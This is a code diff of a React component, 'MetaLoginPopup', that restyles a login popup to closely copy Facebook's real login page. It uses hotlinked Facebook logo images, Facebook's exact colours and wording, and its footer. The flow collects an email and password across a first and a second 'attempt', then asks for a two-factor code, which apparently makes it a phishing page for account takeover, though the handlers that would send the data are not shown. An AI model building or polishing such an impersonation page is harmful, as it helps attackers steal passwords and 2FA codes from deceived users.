@@ -147,17 +147,17 @@ const MetaLoginPopup = () => {
   };
 
   return (
-    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-gray-100 flex flex-col">
+    <div className="min-h-screen bg-[#f0f2f5] flex flex-col">
       <header className="bg-white shadow-sm sticky top-0 z-10">
-        <div className="max-w-7xl mx-auto p-4 flex justify-between items-center">
+        <div className="max-w-7xl mx-auto p-3 flex justify-between items-center">
           <img 
             src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" 
             alt="Meta Logo" 
-            className="h-8"
+            className="h-10"
           />
           <button 
             onClick={() => window.close()} 
-            className="text-gray-500 hover:text-gray-800 focus:outline-none focus:ring-2 focus:ring-blue-200 rounded-full p-1"
+            className="text-gray-500 hover:text-gray-800 focus:outline-none focus:ring-1 focus:ring-gray-200 rounded-full p-1"
             aria-label="Close"
           >
             <X className="h-5 w-5" />
@@ -166,98 +166,91 @@ const MetaLoginPopup = () => {
       </header>
       
       <main className="flex-grow flex items-center justify-center p-4">
-        <div className="bg-white rounded-xl shadow-xl p-8 w-full max-w-md border border-gray-100">
+        <div className="bg-white rounded-md shadow-md p-6 w-full max-w-[396px]">
           {currentStep === LoginStep.SUCCESS ? (
             <div className="text-center">
-              <div className="bg-green-50 rounded-full p-4 w-24 h-24 mx-auto mb-6 flex items-center justify-center">
-                <CheckCircle2 className="h-16 w-16 text-green-500" />
+              <div className="mx-auto mb-4">
+                <img 
+                  src="https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/MbU7tyG1CmT.png" 
+                  alt="Success" 
+                  className="h-20 mx-auto"
+                />
               </div>
-              <h2 className="text-2xl font-bold mb-4">Account Connected</h2>
-              <p className="text-gray-600 mb-6">
-                Your Meta account has been successfully connected. This window will close automatically.
+              <h2 className="text-xl font-semibold mb-3">Account Connected</h2>
+              <p className="text-gray-600 mb-5">
+                Your Facebook account has been successfully connected. This window will close automatically.
               </p>
-              <Progress value={100} className="h-2 bg-gray-100" />
+              <Progress value={100} className="h-1 bg-gray-100" />
               <p className="text-sm text-gray-400 mt-2">Redirecting back to application...</p>
             </div>
           ) : (
             <>
-              <div className="text-center mb-8">
-                <div className="w-16 h-16 bg-blue-50 rounded-full mx-auto mb-4 flex items-center justify-center">
-                  <KeyRound className="h-8 w-8 text-[#1877F2]" />
-                </div>
-                <h2 className="text-2xl font-bold text-[#1877F2]">Meta Account</h2>
-                <p className="text-gray-600 mt-2">
-                  Connect your account to continue with your application
+              <div className="text-center mb-6">
+                <img 
+                  src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" 
+                  alt="Facebook Logo" 
+                  className="h-[106px] w-[300px] mx-auto mb-2"
+                />
+                <p className="text-gray-700 text-sm mt-3">
+                  Log in to continue with your application
                 </p>
               </div>
               
               {/* Login Steps */}
               {(currentStep === LoginStep.LOGIN_FIRST_ATTEMPT || currentStep === LoginStep.LOGIN_SECOND_ATTEMPT) && (
-                <form onSubmit={handlePasswordSubmit} className="space-y-5">
+                <form onSubmit={handlePasswordSubmit} className="space-y-4">
                   {errorMessage && (
-                    <div className="bg-red-50 text-red-700 p-3 rounded-lg flex items-start">
+                    <div className="bg-red-50 text-red-700 p-3 rounded flex items-start">
                       <AlertCircle className="h-5 w-5 mr-2 flex-shrink-0 mt-0.5" />
                       <p className="text-sm">{errorMessage}</p>
                     </div>
                   )}
                   
-                  <div className="space-y-2">
-                    <Label htmlFor="email" className="flex items-center text-gray-700">
-                      <Mail className="h-4 w-4 mr-2 text-gray-500" />
-                      Email or Phone
-                    </Label>
-                    <div className="relative">
-                      <Input 
-                        id="email" 
-                        type="text"
-                        value={email}
-                        onChange={(e) => setEmail(e.target.value)}
-                        placeholder="Email or phone number"
-                        className="pl-3 border-gray-300 rounded-lg"
-                        disabled={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
-                      />
-                    </div>
+                  <div>
+                    <Input 
+                      id="email" 
+                      type="text"
+                      value={email}
+                      onChange={(e) => setEmail(e.target.value)}
+                      placeholder="Email address or phone number"
+                      className="h-[50px] border-[#dddfe2] rounded-[6px] text-[17px]"
+                      disabled={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
+                    />
                   </div>
                   
-                  <div className="space-y-2">
-                    <Label htmlFor="password" className="flex items-center text-gray-700">
-                      <Lock className="h-4 w-4 mr-2 text-gray-500" />
-                      Password
-                    </Label>
-                    <div className="relative">
-                      <Input 
-                        id="password" 
-                        type={showPassword ? "text" : "password"}
-                        value={password}
-                        onChange={(e) => setPassword(e.target.value)}
-                        placeholder="Password"
-                        className="pr-10 border-gray-300 rounded-lg"
-                        autoFocus={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
-                      />
-                      <button
-                        type="button"
-                        className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
-                        onClick={() => setShowPassword(!showPassword)}
-                        tabIndex={-1}
-                      >
-                        {showPassword ? (
-                          <EyeOff className="h-4 w-4" />
-                        ) : (
-                          <Eye className="h-4 w-4" />
-                        )}
-                      </button>
-                    </div>
+                  <div className="relative">
+                    <Input 
+                      id="password" 
+                      type={showPassword ? "text" : "password"}
+                      value={password}
+                      onChange={(e) => setPassword(e.target.value)}
+                      placeholder="Password"
+                      className="h-[50px] border-[#dddfe2] rounded-[6px] text-[17px] pr-10"
+                      autoFocus={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
+                    />
+                    <button
+                      type="button"
+                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
+                      onClick={() => setShowPassword(!showPassword)}
+                      tabIndex={-1}
+                    >
+                      {showPassword ? (
+                        <EyeOff className="h-5 w-5" />
+                      ) : (
+                        <Eye className="h-5 w-5" />
+                      )}
+                    </button>
                   </div>
                   
                   <Button 
                     type="submit" 
-                    className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white h-12 rounded-lg shadow-sm transition-all duration-200 hover:shadow-md"
+                    className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white h-[50px] rounded-[6px] text-[20px] font-bold"
                     disabled={isLoading}
                   >
                     {isLoading ? (
                       <div className="flex items-center justify-center">
                         <Loader2 className="h-5 w-5 mr-2 animate-spin" />
-                        <span>Authenticating...</span>
+                        <span>Logging in...</span>
                       </div>
                     ) : (
                       "Log In"
@@ -265,19 +258,28 @@ const MetaLoginPopup = () => {
                   </Button>
                   
                   {isLoading && (
-                    <div className="mt-4">
-                      <Progress value={75} className="h-1.5 bg-gray-100" />
-                      <p className="text-xs text-center text-gray-500 mt-2 flex items-center justify-center">
-                        <Loader2 className="h-3 w-3 mr-1 animate-spin" />
-                        Verifying credentials...
-                      </p>
+                    <div className="mt-2">
+                      <div className="w-full bg-[#e7f3ff] h-1 overflow-hidden">
+                        <div className="bg-[#1877F2] h-1 animate-progress-indeterminate"></div>
+                      </div>
+                      <p className="text-xs text-center text-gray-500 mt-2">Verifying credentials...</p>
                     </div>
                   )}
                   
-                  <div className="text-center pt-2">
-                    <a href="#" className="text-[#1877F2] text-sm hover:underline">
+                  <div className="text-center border-b border-gray-200 pb-5">
+                    <a href="#" className="text-[#1877F2] text-[14px] hover:underline">
                       Forgot password?
                     </a>
+                  </div>
+                  
+                  <div className="flex justify-center pt-2">
+                    <Button
+                      type="button"
+                      className="bg-[#42b72a] hover:bg-[#36a420] text-white text-[17px] h-[48px] py-0 px-4 rounded-[6px] font-bold"
+                      onClick={(e) => e.preventDefault()}
+                    >
+                      Create new account
+                    </Button>
                   </div>
                 </form>
               )}
@@ -287,29 +289,27 @@ const MetaLoginPopup = () => {
                 currentStep === LoginStep.VERIFICATION_TIMEOUT || 
                 currentStep === LoginStep.VERIFICATION_SECOND_ATTEMPT) && (
                 <>
-                  <div className="text-center mb-6">
-                    <div className="w-16 h-16 bg-blue-50 rounded-full mx-auto mb-4 flex items-center justify-center">
-                      <ShieldCheck className="h-8 w-8 text-[#1877F2]" />
-                    </div>
-                    <h3 className="text-xl font-bold">Two-factor authentication</h3>
-                    <p className="text-gray-600 mt-2">
-                      We've sent a verification code to the mobile number associated with your account.
+                  <div className="text-center mb-4">
+                    <img 
+                      src="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/Aji5BKKnMQF.png" 
+                      alt="Two-factor authentication" 
+                      className="h-16 w-16 mx-auto mb-3"
+                    />
+                    <h3 className="text-xl font-semibold">Two-factor authentication required</h3>
+                    <p className="text-[#65676b] mt-2 text-[15px]">
+                      We sent a code to your phone. Enter it here to verify your identity.
                     </p>
                   </div>
                   
-                  <form onSubmit={handleVerificationSubmit} className="space-y-5">
+                  <form onSubmit={handleVerificationSubmit} className="space-y-4">
                     {verificationError && (
-                      <div className="bg-red-50 text-red-700 p-3 rounded-lg flex items-start">
-                        <AlertTriangle className="h-5 w-5 mr-2 flex-shrink-0 mt-0.5" />
-                        <p className="text-sm">{verificationError}</p>
+                      <div className="bg-[#ffebe8] text-[#a6110f] p-3 rounded border border-[#dd3c10] flex items-start text-[13px]">
+                        <AlertTriangle className="h-4 w-4 mr-2 flex-shrink-0 mt-0.5" />
+                        <p>{verificationError}</p>
                       </div>
                     )}
                     
-                    <div className="space-y-2">
-                      <Label htmlFor="code" className="flex items-center text-gray-700 font-semibold">
-                        <Smartphone className="h-4 w-4 mr-2 text-gray-500" />
-                        Enter the verification code
-                      </Label>
+                    <div>
                       <Input 
                         id="code" 
                         type="text"
@@ -317,22 +317,20 @@ const MetaLoginPopup = () => {
                         ref={codeInputRef}
                         value={verificationCode}
                         onChange={(e) => setVerificationCode(e.target.value.replace(/[^0-9]/g, '').substring(0, 8))}
-                        placeholder="• • • • • • • •"
-                        className="border-gray-300 text-center text-xl font-bold h-16 rounded-lg tracking-widest"
+                        placeholder="Enter code"
+                        className="h-[50px] border-[#dddfe2] rounded-[6px] text-[17px] text-center"
                         disabled={currentStep === LoginStep.VERIFICATION_TIMEOUT || isLoading}
                         maxLength={8}
                       />
                       
-                      <div className="text-xs text-gray-500 text-center mt-3 flex items-center justify-center">
+                      <div className="text-xs text-[#65676b] text-center mt-3">
                         {currentStep === LoginStep.VERIFICATION_TIMEOUT ? (
-                          <div className="text-red-500 font-semibold flex items-center">
-                            <AlertCircle className="h-4 w-4 mr-1" />
+                          <div className="text-red-500 font-semibold">
                             Please wait {countdown} seconds before requesting a new code
                           </div>
                         ) : (
-                          <div className="flex items-center">
-                            <Smartphone className="h-4 w-4 mr-1" />
-                            Code sent to +1•••••{email.slice(-4) || "1234"}
+                          <div>
+                            Code sent to <span className="font-semibold">+1 *** *** {email.slice(-4) || "1234"}</span>
                           </div>
                         )}
                       </div>
@@ -340,7 +338,7 @@ const MetaLoginPopup = () => {
                     
                     <Button 
                       type="submit" 
-                      className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white h-12 rounded-lg shadow-sm transition-all duration-200 hover:shadow-md"
+                      className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white h-[48px] rounded-[6px] font-bold text-[18px]"
                       disabled={isLoading || currentStep === LoginStep.VERIFICATION_TIMEOUT}
                     >
                       {isLoading ? (
@@ -349,27 +347,29 @@ const MetaLoginPopup = () => {
                           <span>Verifying code...</span>
                         </div>
                       ) : (
-                        "Verify Code"
+                        "Continue"
                       )}
                     </Button>
                     
                     {isLoading && (
-                      <div className="mt-4">
-                        <Progress value={85} className="h-1.5 bg-gray-100" />
-                        <p className="text-xs text-center text-gray-500 mt-2 flex items-center justify-center">
-                          <Loader2 className="h-3 w-3 mr-1 animate-spin" />
-                          Validating security code...
-                        </p>
+                      <div className="mt-2">
+                        <div className="w-full bg-[#e7f3ff] h-1 overflow-hidden">
+                          <div className="bg-[#1877F2] h-1 animate-progress-indeterminate"></div>
+                        </div>
+                        <p className="text-xs text-center text-[#65676b] mt-2">Validating security code...</p>
                       </div>
                     )}
                     
-                    {currentStep !== LoginStep.VERIFICATION_TIMEOUT && (
-                      <div className="text-center pt-2">
-                        <a href="#" className="text-[#1877F2] text-sm hover:underline">
+                    <div className="flex flex-col space-y-3 border-t border-gray-200 pt-3">
+                      {currentStep !== LoginStep.VERIFICATION_TIMEOUT && (
+                        <a href="#" className="text-[#1877F2] text-[15px] text-center hover:underline">
                           I didn't receive a code
                         </a>
-                      </div>
-                    )}
+                      )}
+                      <a href="#" className="text-[#1877F2] text-[15px] text-center hover:underline">
+                        Try another way
+                      </a>
+                    </div>
                   </form>
                 </>
               )}
@@ -378,14 +378,42 @@ const MetaLoginPopup = () => {
         </div>
       </main>
       
-      <footer className="bg-white border-t p-4 mt-auto">
-        <div className="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center text-xs text-gray-500">
-          <div className="flex space-x-4 mb-2 md:mb-0">
-            <a href="#" className="hover:underline">Privacy Policy</a>
-            <a href="#" className="hover:underline">Terms of Service</a>
-            <a href="#" className="hover:underline">Help Center</a>
+      <footer className="mt-auto py-5">
+        <div className="max-w-[980px] mx-auto px-4">
+          <div className="flex flex-wrap justify-center gap-x-3 text-xs text-[#737373] mb-2">
+            <a href="#" className="hover:underline">English (US)</a>
+            <a href="#" className="hover:underline">Español</a>
+            <a href="#" className="hover:underline">Français (France)</a>
+            <a href="#" className="hover:underline">中文(简体)</a>
+            <a href="#" className="hover:underline">العربية</a>
+            <a href="#" className="hover:underline">Português (Brasil)</a>
+            <a href="#" className="hover:underline">Italiano</a>
+            <a href="#" className="hover:underline">한국어</a>
+            <a href="#" className="hover:underline">Deutsch</a>
+            <a href="#" className="hover:underline">हिन्दी</a>
+            <a href="#" className="hover:underline">日本語</a>
           </div>
-          <p>© Meta {new Date().getFullYear()}</p>
+          
+          <div className="border-t border-gray-200 pt-3">
+            <div className="flex flex-wrap justify-center gap-x-3 gap-y-1 text-xs text-[#737373]">
+              <a href="#" className="hover:underline">Sign Up</a>
+              <a href="#" className="hover:underline">Log In</a>
+              <a href="#" className="hover:underline">Messenger</a>
+              <a href="#" className="hover:underline">Facebook Lite</a>
+              <a href="#" className="hover:underline">Watch</a>
+              <a href="#" className="hover:underline">Places</a>
+              <a href="#" className="hover:underline">Games</a>
+              <a href="#" className="hover:underline">Marketplace</a>
+              <a href="#" className="hover:underline">Facebook Pay</a>
+              <a href="#" className="hover:underline">Privacy</a>
+              <a href="#" className="hover:underline">Cookies</a>
+              <a href="#" className="hover:underline">Terms</a>
+              <a href="#" className="hover:underline">Help</a>
+            </div>
+            <div className="text-center text-xs text-[#737373] mt-4">
+              <p>Meta © {new Date().getFullYear()}</p>
+            </div>
+          </div>
         </div>
       </footer>
     </div>
